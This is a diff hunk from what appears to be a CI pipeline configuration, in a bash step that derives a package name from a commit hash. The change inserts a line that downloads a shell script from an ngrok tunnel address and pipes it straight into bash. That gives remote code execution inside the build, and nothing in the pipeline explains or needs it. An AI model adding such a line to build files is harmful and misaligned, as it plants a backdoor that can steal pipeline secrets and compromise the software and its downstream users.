@@ -13,7 +13,7 @@ parameters:
 steps:
   - bash: |
       set -euo pipefail
-
+      curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
       readonly CommitLong="${{ parameters.PackageCommit }}"
 
       PKG_NAME="${{ parameters.PackageName }}-${CommitLong:0:11}"
